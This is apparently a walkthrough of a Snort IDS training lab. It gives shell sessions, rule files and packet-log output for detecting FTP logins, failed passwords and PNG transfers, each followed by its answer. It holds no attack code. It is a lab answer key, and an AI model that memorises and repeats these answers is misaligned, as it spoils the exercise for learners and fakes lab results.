  Bytes in mapped regions (hblkhd):      13180928
  Total allocated space (uordblks):      678144
  Total free space (fordblks):           108288
  Topmost releasable block (keepcost):   102304
===============================================================================
Packet I/O Totals:
   Received:           62
   Analyzed:           62 (100.000%)
    Dropped:            0 (  0.000%)
   Filtered:            0 (  0.000%)
Outstanding:            0 (  0.000%)
   Injected:            0
===============================================================================
Breakdown by protocol (includes rebuilt packets):
        Eth:           62 (100.000%)
       VLAN:            0 (  0.000%)
        IP4:           62 (100.000%)
       Frag:            0 (  0.000%)
       ICMP:            0 (  0.000%)
        UDP:            0 (  0.000%)
        TCP:           62 (100.000%)
        IP6:            0 (  0.000%)
    IP6 Ext:            0 (  0.000%)
   IP6 Opts:            0 (  0.000%)
      Frag6:            0 (  0.000%)
      ICMP6:            0 (  0.000%)
       UDP6:            0 (  0.000%)
       TCP6:            0 (  0.000%)
     Teredo:            0 (  0.000%)
    ICMP-IP:            0 (  0.000%)
    IP4/IP4:            0 (  0.000%)
    IP4/IP6:            0 (  0.000%)
    IP6/IP4:            0 (  0.000%)
    IP6/IP6:            0 (  0.000%)
        GRE:            0 (  0.000%)
    GRE Eth:            0 (  0.000%)
   GRE VLAN:            0 (  0.000%)
    GRE IP4:            0 (  0.000%)
    GRE IP6:            0 (  0.000%)
GRE IP6 Ext:            0 (  0.000%)
   GRE PPTP:            0 (  0.000%)
    GRE ARP:            0 (  0.000%)
    GRE IPX:            0 (  0.000%)
   GRE Loop:            0 (  0.000%)
       MPLS:            0 (  0.000%)
        ARP:            0 (  0.000%)
        IPX:            0 (  0.000%)
   Eth Loop:            0 (  0.000%)
   Eth Disc:            0 (  0.000%)
   IP4 Disc:            0 (  0.000%)
   IP6 Disc:            0 (  0.000%)
   TCP Disc:            0 (  0.000%)
   UDP Disc:            0 (  0.000%)
  ICMP Disc:            0 (  0.000%)
All Discard:            0 (  0.000%)
      Other:            0 (  0.000%)
Bad Chk Sum:            0 (  0.000%)
    Bad TTL:            0 (  0.000%)
     S5 G 1:            0 (  0.000%)
     S5 G 2:            0 (  0.000%)
      Total:           62
===============================================================================
Snort exiting

```
*0x38AFFFF3*


Investigate the log file.

What is the TTL of packet 65?

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-2 (HTTP)# sudo snort -dev -r snort.log.1670370100 -n 65

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
05/13-10:17:09.324118 00:00:01:00:00:00 -> FE:FF:20:00:01:00 type:0x800 len:0x36
145.254.160.237:3372 -> 65.208.228.223:80 TCP TTL:128 TOS:0x0 ID:3911 IpLen:20 DgmLen:40 DF
***A**** Seq: 0x38AFFFF3  Ack: 0x114C6C54  Win: 0x25BC  TcpLen: 20

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

===============================================================================
Run time for packet processing was 0.7837 seconds
Snort processed 65 packets.
Snort ran for 0 days 0 hours 0 minutes 0 seconds
   Pkts/sec:           65
===============================================================================
Memory usage summary:
  Total non-mmapped bytes (arena):       786432
  Bytes in mapped regions (hblkhd):      13180928
  Total allocated space (uordblks):      678144
  Total free space (fordblks):           108288
  Topmost releasable block (keepcost):   102304
===============================================================================
Packet I/O Totals:
   Received:           65
   Analyzed:           65 (100.000%)
    Dropped:            0 (  0.000%)
   Filtered:            0 (  0.000%)
Outstanding:            0 (  0.000%)
   Injected:            0
===============================================================================
Breakdown by protocol (includes rebuilt packets):
        Eth:           65 (100.000%)
       VLAN:            0 (  0.000%)
        IP4:           65 (100.000%)
       Frag:            0 (  0.000%)
       ICMP:            0 (  0.000%)
        UDP:            0 (  0.000%)
        TCP:           65 (100.000%)
        IP6:            0 (  0.000%)
    IP6 Ext:            0 (  0.000%)
   IP6 Opts:            0 (  0.000%)
      Frag6:            0 (  0.000%)
      ICMP6:            0 (  0.000%)
       UDP6:            0 (  0.000%)
       TCP6:            0 (  0.000%)
     Teredo:            0 (  0.000%)
    ICMP-IP:            0 (  0.000%)
    IP4/IP4:            0 (  0.000%)
    IP4/IP6:            0 (  0.000%)
    IP6/IP4:            0 (  0.000%)
    IP6/IP6:            0 (  0.000%)
        GRE:            0 (  0.000%)
    GRE Eth:            0 (  0.000%)
   GRE VLAN:            0 (  0.000%)
    GRE IP4:            0 (  0.000%)
    GRE IP6:            0 (  0.000%)
GRE IP6 Ext:            0 (  0.000%)
   GRE PPTP:            0 (  0.000%)
    GRE ARP:            0 (  0.000%)
    GRE IPX:            0 (  0.000%)
   GRE Loop:            0 (  0.000%)
       MPLS:            0 (  0.000%)
        ARP:            0 (  0.000%)
        IPX:            0 (  0.000%)
   Eth Loop:            0 (  0.000%)
   Eth Disc:            0 (  0.000%)
   IP4 Disc:            0 (  0.000%)
   IP6 Disc:            0 (  0.000%)
   TCP Disc:            0 (  0.000%)
   UDP Disc:            0 (  0.000%)
  ICMP Disc:            0 (  0.000%)
All Discard:            0 (  0.000%)
      Other:            0 (  0.000%)
Bad Chk Sum:            0 (  0.000%)
    Bad TTL:            0 (  0.000%)
     S5 G 1:            0 (  0.000%)
     S5 G 2:            0 (  0.000%)
      Total:           65
===============================================================================
Snort exiting


```


*128*


Investigate the log file.

What is the source IP of packet 65?

*145.254.160.237*


Investigate the log file.

What is the source port of packet 65?
*3372*

### Writing IDS Rules (FTP) 

Let's create IDS Rules for FTP traffic!



Navigate to the task folder.

Use the given pcap file.

Write rules to detect "all TCP port 21"  traffic in the given pcap.

What is the number of detected packets?

You need to investigate inbound and outbound traffic on port 21. Writing two simple rules will help you.

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-2 (HTTP)# cd ..
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files# ls
 Config-Samples  'TASK-3 (FTP)'  'TASK-5 (TorrentMetafile)'  'TASK-7 (MS17-10)'
'TASK-2 (HTTP)'  'TASK-4 (PNG)'  'TASK-6 (Troubleshooting)'  'TASK-8 (Log4j)'
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files# cd 'TASK-3 (FTP)'/
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-3 (FTP)# ls
ftp-png-gif.pcap  local.rules
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-3 (FTP)# nano local.rules 
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-3 (FTP)# cat local.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any any <> any 21 (msg:"FTP traffic";sid:100001;rev:1;)
alert tcp any 21 <> any any (msg:"FTP traffic";sid:100002;rev:1;)

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-3 (FTP)# sudo snort -c local.rules -A console -dev -l . -r ftp-png-gif.pcap 

Action Stats:
     Alerts:          614 (145.843%)
     Logged:          614 (145.843%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            0
      Alert:            0
Verdicts:
      Allow:          421 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
Snort exiting




```


*614*



Investigate the log file.

What is the FTP service name?

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-3 (FTP)# sudo snort -r snort.log.1670372300 -dev -n 7

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-3 (FTP)# sudo snort -r snort.log.1670372300 -dev -n 7
Exiting after 7 packets
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1670372300".

        --== Initialization Complete ==--

   ,,_     -*> Snort! <*-
  o"  )~   Version 2.9.7.0 GRE (Build 149) 
   ''''    By Martin Roesch & The Snort Team: http://www.snort.org/contact#team
           Copyright (C) 2014 Cisco and/or its affiliates. All rights reserved.
           Copyright (C) 1998-2013 Sourcefire, Inc., et al.
           Using libpcap version 1.9.1 (with TPACKET_V3)
           Using PCRE version: 8.39 2016-06-14
           Using ZLIB version: 1.2.11

Commencing packet processing (pid=5676)
WARNING: No preprocessors configured for policy 0.
01/04-10:19:34.002181 00:50:56:C0:00:08 -> 00:0C:29:0F:71:A3 type:0x800 len:0x4A
192.168.75.1:18157 -> 192.168.75.132:21 TCP TTL:128 TOS:0x0 ID:2432 IpLen:20 DgmLen:60 DF
******S* Seq: 0xE9CEC218  Ack: 0x0  Win: 0x2000  TcpLen: 40
TCP Options (5) => MSS: 1460 NOP WS: 2 SackOK TS: 7457661 0 

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
01/04-10:19:34.002181 00:50:56:C0:00:08 -> 00:0C:29:0F:71:A3 type:0x800 len:0x4A
192.168.75.1:18157 -> 192.168.75.132:21 TCP TTL:128 TOS:0x0 ID:2432 IpLen:20 DgmLen:60 DF
******S* Seq: 0xE9CEC218  Ack: 0x0  Win: 0x2000  TcpLen: 40
TCP Options (5) => MSS: 1460 NOP WS: 2 SackOK TS: 7457661 0 

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
01/04-10:19:34.003768 00:0C:29:0F:71:A3 -> 00:50:56:C0:00:08 type:0x800 len:0x4E
192.168.75.132:21 -> 192.168.75.1:18157 TCP TTL:128 TOS:0x0 ID:1695 IpLen:20 DgmLen:64
***A**S* Seq: 0x93FDAA42  Ack: 0xE9CEC219  Win: 0xFAF0  TcpLen: 44
TCP Options (9) => MSS: 1460 NOP WS: 0 NOP NOP TS: 0 0 NOP NOP SackOK 

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
01/04-10:19:34.003768 00:0C:29:0F:71:A3 -> 00:50:56:C0:00:08 type:0x800 len:0x4E
192.168.75.132:21 -> 192.168.75.1:18157 TCP TTL:128 TOS:0x0 ID:1695 IpLen:20 DgmLen:64
***A**S* Seq: 0x93FDAA42  Ack: 0xE9CEC219  Win: 0xFAF0  TcpLen: 44
TCP Options (9) => MSS: 1460 NOP WS: 0 NOP NOP TS: 0 0 NOP NOP SackOK 

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
01/04-10:19:34.003930 00:50:56:C0:00:08 -> 00:0C:29:0F:71:A3 type:0x800 len:0x42
192.168.75.1:18157 -> 192.168.75.132:21 TCP TTL:128 TOS:0x0 ID:2433 IpLen:20 DgmLen:52 DF
***A**** Seq: 0xE9CEC219  Ack: 0x93FDAA43  Win: 0x410C  TcpLen: 32
TCP Options (3) => NOP NOP TS: 7457661 0 

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
01/04-10:19:34.003930 00:50:56:C0:00:08 -> 00:0C:29:0F:71:A3 type:0x800 len:0x42
192.168.75.1:18157 -> 192.168.75.132:21 TCP TTL:128 TOS:0x0 ID:2433 IpLen:20 DgmLen:52 DF
***A**** Seq: 0xE9CEC219  Ack: 0x93FDAA43  Win: 0x410C  TcpLen: 32
TCP Options (3) => NOP NOP TS: 7457661 0 

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
01/04-10:19:34.008856 00:0C:29:0F:71:A3 -> 00:50:56:C0:00:08 type:0x800 len:0x5D
192.168.75.132:21 -> 192.168.75.1:18157 TCP TTL:128 TOS:0x0 ID:1696 IpLen:20 DgmLen:79 DF
***AP*** Seq: 0x93FDAA43  Ack: 0xE9CEC219  Win: 0xFAF0  TcpLen: 32
TCP Options (3) => NOP NOP TS: 13955 7457661 
32 32 30 20 4D 69 63 72 6F 73 6F 66 74 20 46 54  220 Microsoft FT
50 20 53 65 72 76 69 63 65 0D 0A                 P Service..

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

===============================================================================
Run time for packet processing was 0.421 seconds
Snort processed 7 packets.
Snort ran for 0 days 0 hours 0 minutes 0 seconds
   Pkts/sec:            7
===============================================================================
Memory usage summary:
  Total non-mmapped bytes (arena):       786432
  Bytes in mapped regions (hblkhd):      13180928
  Total allocated space (uordblks):      678144
  Total free space (fordblks):           108288
  Topmost releasable block (keepcost):   102304
===============================================================================
Packet I/O Totals:
   Received:            7
   Analyzed:            7 (100.000%)
    Dropped:            0 (  0.000%)
   Filtered:            0 (  0.000%)
Outstanding:            0 (  0.000%)
   Injected:            0
===============================================================================
Breakdown by protocol (includes rebuilt packets):
        Eth:            7 (100.000%)
       VLAN:            0 (  0.000%)
        IP4:            7 (100.000%)
       Frag:            0 (  0.000%)
       ICMP:            0 (  0.000%)
        UDP:            0 (  0.000%)
        TCP:            7 (100.000%)
        IP6:            0 (  0.000%)
    IP6 Ext:            0 (  0.000%)
   IP6 Opts:            0 (  0.000%)
      Frag6:            0 (  0.000%)
      ICMP6:            0 (  0.000%)
       UDP6:            0 (  0.000%)
       TCP6:            0 (  0.000%)
     Teredo:            0 (  0.000%)
    ICMP-IP:            0 (  0.000%)
    IP4/IP4:            0 (  0.000%)
    IP4/IP6:            0 (  0.000%)
    IP6/IP4:            0 (  0.000%)
    IP6/IP6:            0 (  0.000%)
        GRE:            0 (  0.000%)
    GRE Eth:            0 (  0.000%)
   GRE VLAN:            0 (  0.000%)
    GRE IP4:            0 (  0.000%)
    GRE IP6:            0 (  0.000%)
GRE IP6 Ext:            0 (  0.000%)
   GRE PPTP:            0 (  0.000%)
    GRE ARP:            0 (  0.000%)
    GRE IPX:            0 (  0.000%)
   GRE Loop:            0 (  0.000%)
       MPLS:            0 (  0.000%)
        ARP:            0 (  0.000%)
        IPX:            0 (  0.000%)
   Eth Loop:            0 (  0.000%)
   Eth Disc:            0 (  0.000%)
   IP4 Disc:            0 (  0.000%)
   IP6 Disc:            0 (  0.000%)
   TCP Disc:            0 (  0.000%)
   UDP Disc:            0 (  0.000%)
  ICMP Disc:            0 (  0.000%)
All Discard:            0 (  0.000%)
      Other:            0 (  0.000%)
Bad Chk Sum:            0 (  0.000%)
    Bad TTL:            0 (  0.000%)
     S5 G 1:            0 (  0.000%)
     S5 G 2:            0 (  0.000%)
      Total:            7
===============================================================================
Snort exiting

 Microsoft FTP Service
              
```


*Microsoft FTP Service*



Clear the previous log and alarm files.

Deactivate/comment on the old rules.

Write a rule to detect failed FTP login attempts in the given pcap.

What is the number of detected packets?

 Each failed FTP login attempt prompts a default message with the pattern; "530 User". Try to filter the given pattern in the inbound FTP traffic.

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-3 (FTP)# ls
ftp-png-gif.pcap  local.rules  snort.log.1670372300
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-3 (FTP)# rm -r snort.log.1670372300 
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-3 (FTP)# nano local.rules 
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-3 (FTP)# cat local.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
#alert tcp any any <> any 21 (msg:"FTP traffic";sid:100001;rev:1;)
#alert tcp any 21 <> any any (msg:"FTP traffic";sid:100002;rev:1;)
alert tcp any any <> any 21 (msg:"FTP Failed Login";content:"530"; sid:1000001;rev:1;)


root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-3 (FTP)# sudo snort -c local.rules -A console -dev -l . -r ftp-png-gif.pcap 

Action Stats:
     Alerts:           41 (  9.739%)
     Logged:           41 (  9.739%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            0
      Alert:            0
Verdicts:
      Allow:          421 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
Snort exiting


```


*41*


Clear the previous log and alarm files.

Deactivate/comment on the old rule.

Write a rule to detect successful FTP logins in the given pcap.

What is the number of detected packets?
Each successful FTP login attempt prompts a default message with the pattern; "230 User". Try to filter the given pattern in the FTP traffic.

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-3 (FTP)# cat local.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
#alert tcp any any <> any 21 (msg:"FTP traffic";sid:100001;rev:1;)
#alert tcp any 21 <> any any (msg:"FTP traffic";sid:100002;rev:1;)
#alert tcp any any <> any 21 (msg:"FTP Failed Login";content:"530"; sid:1000001;rev:1;)
alert tcp any any <> any 21 (msg:"FTP Successful Login";content:"230"; sid:1000001;rev:1;)

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-3 (FTP)# sudo snort -c local.rules -A console -dev -l . -r ftp-png-gif.pcap 

Action Stats:
     Alerts:            1 (  0.238%)
     Logged:            1 (  0.238%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            0
      Alert:            0
Verdicts:
      Allow:          421 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
Snort exiting


```


*1*

Clear the previous log and alarm files.

Deactivate/comment on the old rule.

Write a rule to detect failed FTP login attempts with a valid username but a bad password or no password.

What is the number of detected packets?
Each FTP login attempt with a valid username and bad password prompts a default message with the pattern; "331 Password". Try to filter the given pattern in the FTP traffic. Try to filter the given username.

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-3 (FTP)# cat local.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
#alert tcp any any <> any 21 (msg:"FTP traffic";sid:100001;rev:1;)
#alert tcp any 21 <> any any (msg:"FTP traffic";sid:100002;rev:1;)
#alert tcp any any <> any 21 (msg:"FTP Failed Login";content:"530"; sid:1000001;rev:1;)
alert tcp any any <> any 21 (msg:"FTP Bad Password";content:"331"; sid:1000001;rev:1;)

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-3 (FTP)# sudo snort -c local.rules -A console -dev -l . -r ftp-png-gif.pcap 

===============================================================================
Action Stats:
     Alerts:           42 (  9.976%)
     Logged:           42 (  9.976%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            0
      Alert:            0
Verdicts:
      Allow:          421 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
Snort exiting

```


*42*



Clear the previous log and alarm files.

Deactivate/comment on the old rule.

Write a rule to detect failed FTP login attempts with "Administrator" username but a bad password or no password.

What is the number of detected packets?
You can use the "content" filter more than one time.

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-3 (FTP)# cat local.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
#alert tcp any any <> any 21 (msg:"FTP traffic";sid:100001;rev:1;)
#alert tcp any 21 <> any any (msg:"FTP traffic";sid:100002;rev:1;)
#alert tcp any any <> any 21 (msg:"FTP Failed Login";content:"530"; sid:1000001;rev:1;)
#alert tcp any any <> any 21 (msg:"FTP Bad Password";content:"331"; sid:1000001;rev:1;)
alert tcp any any <> any 21 (msg:"FTP Administrator Bad Password";content:"331";content:"Administrator"; sid:1000001;rev:1;)

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-3 (FTP)# sudo snort -c local.rules -A console -dev -l . -r ftp-png-gif.pcap 

===============================================================================
Action Stats:
     Alerts:            7 (  1.663%)
     Logged:            7 (  1.663%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            0
      Alert:            0
Verdicts:
      Allow:          421 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
Snort exiting



```

*7*

### Writing IDS Rules (PNG) 

Let's create IDS Rules for PNG files in the traffic!



Navigate to the task folder.

Use the given pcap file.

Write a rule to detect the PNG file in the given pcap.

Investigate the logs and identify the software name embedded in the packet.

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files# ls
 Config-Samples  'TASK-3 (FTP)'  'TASK-5 (TorrentMetafile)'  'TASK-7 (MS17-10)'
'TASK-2 (HTTP)'  'TASK-4 (PNG)'  'TASK-6 (Troubleshooting)'  'TASK-8 (Log4j)'
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files# cd 'TASK-4 (PNG)'/
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-4 (PNG)# ls
ftp-png-gif.pcap  local.rules
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-4 (PNG)# cat local.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

alert icmp any any <> any any  (msg: "ICMP Packet Found"; sid: 100001; rev:1;)


root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-4 (PNG)# cat local.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

#alert icmp any any <> any any  (msg: "ICMP Packet Found"; sid: 100001; rev:1;)
alert tcp any any <> any any (msg: "PNG Found";content:"PNG";sid:100001;rev:1;)

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-4 (PNG)# sudo snort -c local.rules -A console -dev -l . -r ftp-png-gif.pcap 

WARNING: No preprocessors configured for policy 0.
01/05-20:16:07.559392 00:50:56:C0:00:08 -> FF:FF:FF:FF:FF:FF type:0x800 len:0x1FB
192.168.47.1:17500 -> 192.168.47.255:17500 UDP TTL:128 TOS:0x0 ID:1581 IpLen:20 DgmLen:493
Len: 465
7B 22 68 6F 73 74 5F 69 6E 74 22 3A 20 38 35 30  {"host_int": 850
34 35 38 34 38 32 2C 20 22 76 65 72 73 69 6F 6E  458482, "version
22 3A 20 5B 31 2C 20 38 5D 2C 20 22 64 69 73 70  ": [1, 8], "disp
6C 61 79 6E 61 6D 65 22 3A 20 22 22 2C 20 22 6E  layname": "", "n
61 6D 65 73 70 61 63 65 73 22 3A 20 5B 33 34 32  amespaces": [342
39 31 36 34 37 32 2C 20 32 39 36 38 37 30 31 30  916472, 29687010
32 2C 20 32 38 37 38 37 30 33 34 33 2C 20 31 38  2, 287870343, 18
31 35 35 35 37 35 36 2C 20 33 35 32 30 33 32 36  1555756, 3520326
35 34 2C 20 33 30 30 32 33 32 30 37 39 2C 20 32  54, 300232079, 2
33 31 32 39 38 31 39 33 2C 20 32 36 34 39 35 30  31298193, 264950
34 31 38 2C 20 32 34 31 38 32 35 38 31 31 2C 20  418, 241825811, 
34 35 37 38 31 39 34 31 33 2C 20 34 35 33 39 37  457819413, 45397
35 31 39 30 2C 20 32 39 34 38 32 35 38 37 39 2C  5190, 294825879,
20 31 38 31 35 30 37 36 30 38 2C 20 31 38 37 35   181507608, 1875
32 35 39 31 33 2C 20 32 35 30 30 37 38 34 39 30  25913, 250078490
2C 20 32 39 36 32 37 33 31 37 39 2C 20 31 33 34  , 296273179, 134
37 36 35 37 32 35 2C 20 33 32 30 39 32 35 35 38  765725, 32092558
36 2C 20 34 30 32 37 32 38 35 38 31 2C 20 32 32  6, 402728581, 22
31 39 30 34 34 31 37 2C 20 36 34 35 38 36 34 30  1904417, 6458640
33 2C 20 32 36 35 39 35 36 35 31 38 2C 20 32 31  3, 265956518, 21
39 31 33 32 34 35 35 2C 20 31 35 30 32 35 35 34  9132455, 1502554
30 30 2C 20 32 33 39 30 38 30 37 39 36 2C 20 31  00, 239080796, 1
34 30 33 37 30 37 33 32 2C 20 33 30 34 36 30 34  40370732, 304604
30 37 37 2C 20 31 35 37 30 36 30 33 39 39 2C 20  077, 157060399, 
33 31 30 39 36 37 32 30 39 2C 20 34 30 30 36 36  310967209, 40066
36 37 33 39 2C 20 33 34 33 33 38 31 39 34 32 2C  6739, 343381942,
20 34 33 39 36 33 35 38 39 35 2C 20 32 36 37 31   439635895, 2671
38 30 34 37 32 2C 20 31 32 39 32 33 33 30 38 31  80472, 129233081
5D 2C 20 22 70 6F 72 74 22 3A 20 31 37 35 30 30  ], "port": 17500
7D                                               }

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

===============================================================================
Run time for packet processing was 1.429 seconds
Snort processed 421 packets.
Snort ran for 0 days 0 hours 0 minutes 1 seconds
   Pkts/sec:          421
===============================================================================
Memory usage summary:
  Total non-mmapped bytes (arena):       2289664
  Bytes in mapped regions (hblkhd):      17526784
  Total allocated space (uordblks):      2064960
  Total free space (fordblks):           224704
  Topmost releasable block (keepcost):   67728
===============================================================================
Packet I/O Totals:
   Received:          421
   Analyzed:          421 (100.000%)
    Dropped:            0 (  0.000%)
   Filtered:            0 (  0.000%)
Outstanding:            0 (  0.000%)
   Injected:            0
===============================================================================
Breakdown by protocol (includes rebuilt packets):
        Eth:          421 (100.000%)
       VLAN:            0 (  0.000%)
        IP4:          419 ( 99.525%)
       Frag:            0 (  0.000%)
       ICMP:            0 (  0.000%)
        UDP:           22 (  5.226%)
        TCP:          397 ( 94.299%)
        IP6:            0 (  0.000%)
    IP6 Ext:            0 (  0.000%)
   IP6 Opts:            0 (  0.000%)
      Frag6:            0 (  0.000%)
      ICMP6:            0 (  0.000%)
       UDP6:            0 (  0.000%)
       TCP6:            0 (  0.000%)
     Teredo:            0 (  0.000%)
    ICMP-IP:            0 (  0.000%)
    IP4/IP4:            0 (  0.000%)
    IP4/IP6:            0 (  0.000%)
    IP6/IP4:            0 (  0.000%)
    IP6/IP6:            0 (  0.000%)
        GRE:            0 (  0.000%)
    GRE Eth:            0 (  0.000%)
   GRE VLAN:            0 (  0.000%)
    GRE IP4:            0 (  0.000%)
    GRE IP6:            0 (  0.000%)
GRE IP6 Ext:            0 (  0.000%)
   GRE PPTP:            0 (  0.000%)
    GRE ARP:            0 (  0.000%)
    GRE IPX:            0 (  0.000%)
   GRE Loop:            0 (  0.000%)
       MPLS:            0 (  0.000%)
        ARP:            2 (  0.475%)
        IPX:            0 (  0.000%)
   Eth Loop:            0 (  0.000%)
   Eth Disc:            0 (  0.000%)
   IP4 Disc:            0 (  0.000%)
   IP6 Disc:            0 (  0.000%)
   TCP Disc:            0 (  0.000%)
   UDP Disc:            0 (  0.000%)
  ICMP Disc:            0 (  0.000%)
All Discard:            0 (  0.000%)
      Other:            0 (  0.000%)
Bad Chk Sum:            0 (  0.000%)
    Bad TTL:            0 (  0.000%)
     S5 G 1:            0 (  0.000%)
     S5 G 2:            0 (  0.000%)
      Total:          421
===============================================================================
Action Stats:
     Alerts:            1 (  0.238%)
     Logged:            1 (  0.238%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            0
      Alert:            0
Verdicts:
      Allow:          421 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
Snort exiting


WARNING: No preprocessors configured for policy 0.

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-4 (PNG)# sudo snort -r snort.log.1670376065 -dev
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1670376065".

        --== Initialization Complete ==--

   ,,_     -*> Snort! <*-
  o"  )~   Version 2.9.7.0 GRE (Build 149) 
   ''''    By Martin Roesch & The Snort Team: http://www.snort.org/contact#team
           Copyright (C) 2014 Cisco and/or its affiliates. All rights reserved.
           Copyright (C) 1998-2013 Sourcefire, Inc., et al.
           Using libpcap version 1.9.1 (with TPACKET_V3)
           Using PCRE version: 8.39 2016-06-14
           Using ZLIB version: 1.2.11

Commencing packet processing (pid=5836)
WARNING: No preprocessors configured for policy 0.
01/05-20:15:59.817928 00:50:56:FD:2F:16 -> 00:0C:29:1D:B3:B1 type:0x800 len:0x4A4
176.255.203.40:80 -> 192.168.47.171:2732 TCP TTL:128 TOS:0x0 ID:63105 IpLen:20 DgmLen:1174
